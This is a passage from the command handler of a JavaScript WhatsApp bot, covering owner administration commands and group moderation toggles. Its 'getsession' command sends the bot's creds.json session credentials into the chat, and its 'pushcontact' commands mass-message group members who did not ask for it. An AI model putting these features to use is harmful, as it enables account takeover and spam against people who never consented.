            case 'deltitle':{
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (!text) return replygcprexzy(`Usage ${prefix + command} number`)
               nonya = text.split(',')[0]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = ''
               await replygcprexzy(mess.done)
            }
            break
            case 'addlimit':
            case 'givelimit':{
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!text) return replygcprexzy(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                db.data.users[oo].limit += limitnya
                replygcprexzy(mess.done)
            }
            break
            case 'dellimit':{
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!text) return replygcprexzy(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygcprexzy(`His Limit Is Less Than ${limitnya}`)
                db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
                replygcprexzy(mess.done)
            }
            break
            case 'addprem':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 2)
                    return replygcprexzy(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    replygcprexzy("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    replygcprexzy("Premium Success")
                }
            break
            case 'delprem':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 2349159895444`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    }
                    replygcprexzy("Delete Success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    replygcprexzy("Delete Success")
                }
            break
            case 'listprem': {
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                let data = require('./src/data/role/premium.json')
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let x of data) {
                    txt += `Number : ${x.id}\n`
                    txt += `Expire In: ${x.expired} ms\n`
                PrexzyVilla.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'addowner':
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await PrexzyVilla.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcprexzy(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcprexzy(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (!args[0]) return replygcprexzy(`Use ${prefix+command} nomor\nExample ${prefix+command} 2349159895444`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcprexzy(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygcprexzy(teks)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcprexzy('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcprexzy(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcprexzy(teks)
                    await sleep(2000)
                    replygcprexzy("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcprexzy("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!PrexzyTheCreator) return PrexzyStickOwner()
                    if (!text) return replygcprexzy('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcprexzy('Link Invalid!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    PrexzyVilla.groupAcceptInvite(result)
                    await replygcprexzy(`Done`)
                } catch {
                    replygcprexzy('Failed to join the Group')
                }
                break
            case 'getsession':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                replygcprexzy('Wait a moment, currently retrieving your session file')
                let sesi = fs.readFileSync('./session/creds.json')
                PrexzyVilla.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'myip':
            case 'ipbot':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcprexzy("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} hi dev, play command is not working`);

    let devNumber = '2349159895444'; // Your number
    let textt = `*| REQUEST/BUG |*`;
    let teks1 = `\n\n*User:* @${m.sender.split("@")[0]}\n*Request/Bug:* ${text}`;
    let teks2 = `\n\n*Hi ${pushname}, your request has been forwarded to my Owner.*\n*Please wait...*`;

    // Send the bug report to your number only
    PrexzyVilla.sendMessage(devNumber + "@s.whatsapp.net", {
        text: textt + teks1,
        mentions: [m.sender],
    }, { quoted: m });

    // Notify the user that the report has been sent
    PrexzyVilla.sendMessage(m.chat, {
        text: textt + teks2 + teks1,
        mentions: [m.sender],
    }, { quoted: m });
}
break
            case 'shutdown':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                replygcprexzy(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
            break
            case 'autoread':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    replygcprexzy(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    replygcprexzy(`Successfully changed autoread to ${q}`)
                }
            break
            case 'unavailable':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    replygcprexzy(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    replygcprexzy(`Successfully changed unavailable to ${q}`)
                }
            break
            case 'autorecordtype':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecordtype = true
                    replygcprexzy(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
                    replygcprexzy(`Successfully changed Auto-RecordingTyping to ${q}`)
                }
            break
            case 'autorecord':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    replygcprexzy(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    replygcprexzy(`Successfully changed Auto-Recording to ${q}`)
                }
            break
            case 'autotype':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    replygcprexzy(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    replygcprexzy(`Successfully changed Auto-Typing to ${q}`)
                }
            break
            case 'autobio':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    replygcprexzy(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    replygcprexzy(`Successfully Changed AutoBio To ${q}`)
                }
            break
            case 'autosticker': case 'autostickergc':
                if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autosticker = true
                    replygcprexzy(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autosticker = false
                    replygcprexzy(`Successfully Changed AutoBio To ${q}`)
                }
            break
            case 'autoblock':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    replygcprexzy(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    replygcprexzy(`Successfully Changed Auto-Block To ${q}`)
                }
            break
            case 'onlygroup':
            case 'onlygc':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    replygcprexzy(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    replygcprexzy(`Successfully Changed Onlygroup To ${q}`)
                }
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    replygcprexzy(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    replygcprexzy(`Successfully Changed Only-Pc To ${q}`)
                }
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindia = true
                    replygcprexzy(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindia = false
                    replygcprexzy(`Successfully Changed Only-Indian To ${q}`)
                }
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindo = true
                    replygcprexzy(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindo = false
                    replygcprexzy(`Successfully Changed Only-Indonesian To ${q}`)
                }
            break
            case 'self': {
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                PrexzyVilla.public = false
                replygcprexzy('*Successful in Changing To Self Usage*')
            }
            break
            case 'public': {
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                PrexzyVilla.public = true
                replygcprexzy('*Successful in Changing To Public Usage*')
            }
            break
            case 'mode':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (args.length < 1) return replygcprexzy(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    PrexzyVilla.public = true
                    replygcprexzy(mess.done)
                } else if (q == 'self') {
                    PrexzyVilla.public = false
                    replygcprexzy(mess.done)
                }
            break
            case 'setexif':
            case 'setwm':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!text) return replygcprexzy(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcprexzy(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
                case 'setprefix':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!text) return replygcprexzy(`Example : ${prefix + command} packname|author`)
                global.xprefix = text
                replygcprexzy(`Prefix successfully changed to ${text}`)
                break
                case 'setautoblock':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!text) return replygcprexzy(`Example : ${prefix + command} packname|author`)
                global.autoblocknumber = text
                replygcprexzy(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!text) return replygcprexzy(`Example : ${prefix + command} packname|author`)
                global.antiforeignnumber = text
                replygcprexzy(`Anti-foreign number successfully changed to ${text}`)
                break
            case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!quoted) return replygcprexzy(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcprexzy(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcprexzy(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await PrexzyVilla.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await PrexzyVilla.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcprexzy(mess.done)
                } else {
                    var memeg = await PrexzyVilla.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcprexzy(mess.done)
                }
                break
            case 'leave':
            case 'out':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!m.isGroup) return PrexzyStickgroup()
                replygcprexzy('Bye Everyone 🥺')
                await PrexzyVilla.groupLeave(m.chat)
            break
            case 'bc':
            case 'broadcast': {
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (!text) return replygcprexzy('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await PrexzyVilla.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await PrexzyVilla.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await PrexzyVilla.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygcprexzy(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
            }
            break
            case 'pushcontact': {
    if (!PrexzyTheCreator) return PrexzyStickOwner()
      if (!m.isGroup) return replygcprexzy(`The feature works only in grup`)
    if (!text) return replygcprexzy(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcprexzy(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    PrexzyVilla.sendMessage(pler, { text: q})
     }  
     replygcprexzy(`Done`)
      }
      break
case 'pushcontactv2':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (!q) return replygcprexzy(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
await PrexzyStickWait()
const metadata2 = await PrexzyVilla.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
PrexzyVilla.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcprexzy(`Success`)
}
break
case 'block': {
		if (!PrexzyTheCreator) return PrexzyStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await PrexzyVilla.updateBlockStatus(users, 'block')
		await replygcprexzy(`Done`)
	}
	break
	case 'unblock': {
		if (!PrexzyTheCreator) return PrexzyStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await PrexzyVilla.updateBlockStatus(users, 'unblock')
		await replygcprexzy(`Done`)
	}
	break
            case 'bcgc':
            case 'bcgroup': {
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!text) return replygcprexzy(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await PrexzyVilla.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcprexzy(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    PrexzyVilla.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcprexzy(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                try {
                   const getCase = (cases) => {
                      return "case" + `'${cases}'` + fs.readFileSync("QueenNyx.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   replygcprexzy(`${getCase(q)}`)
                } catch {
                  replygcprexzy(`case ${q} not found!`)
                }
            break
            //group
            case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].badword = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].badword = false
                  replygcprexzy(`${commad} is disabled`)
               }
               }
            break
            case 'react': {
    if (!m.quoted) return replygcprexzy("⚠️ Reply to a message to react!");
    if (!text) return replygcprexzy(`Example: ${prefix + command} 😍`);

    try {
        await PrexzyVilla.sendMessage(m.chat, {
            react: {
                text: text,
                key: m.quoted.key
            }
        });

        replygcprexzy(`✅ *Reaction sent:* ${text}\n\nDONE BY QUEEN NYX 👑`);
    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error sending reaction. Try again later.\n\nDONE BY QUEEN NYX 👑");
    }
}
break
           case 'nsfw': {
if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return replygcprexzy('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcprexzy('Success in turning on nsfw in this group')
var groupe = await PrexzyVilla.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
PrexzyVilla.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcprexzy('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcprexzy('Success in turning off nsfw in this group')
} else {
  await replygcprexzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'id':{
            replygcprexzy(from)
           }
          break
            case 'antiaudio':{
            	if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiaudio = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiaudio = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antiforeign':{
            	if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[m.chat].antiforeignnum = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[m.chat].antiforeignnum = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'poll': {
	if (!PrexzyTheCreator) return PrexzyStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcprexzy(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Precious,Prexzy,Nyx...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await PrexzyVilla.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
            case 'antipoll':{
            	if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antipoll = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipoll = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antisticker = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antisticker = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiimage = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiimage = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivideo = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivideo = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antivirtex':{
		         if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivirtex = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivirtex = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antibot':{
		         if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antibot = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antibot = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antiviewonce':{
		         if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiviewonce = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiviewonce = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antimedia = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antimedia = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antidocument = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antidocument = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].anticontact = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].anticontact = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilocation = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilocation = false
                  replygcprexzy(`${command} is disabled`)
               }
               }
            break
            case 'antilink': {
               if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  replygcprexzy(`${command} is disabled`)
               }
            }
            break
            case 'antilinkgc': {
               if (!m.isGroup) return PrexzyStickgroup()
if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  replygcprexzy(`${command} is disabled`)
               }
            }
            break
            case 'welcome':
            case 'left': {
               if (!m.isGroup) return PrexzyStickgroup()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  welcome = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  welcome = false
                  replygcprexzy(`${command} is disabled`)
               }
            }
            break
            case 'adminevent': {
               if (!m.isGroup) return PrexzyStickgroup()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  adminevent = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  adminevent = false
                  replygcprexzy(`${command} is disabled`)
               }
            }
            break
case 'groupevent': {
               if (!m.isGroup) return PrexzyStickgroup()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  groupevent = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  groupevent = false
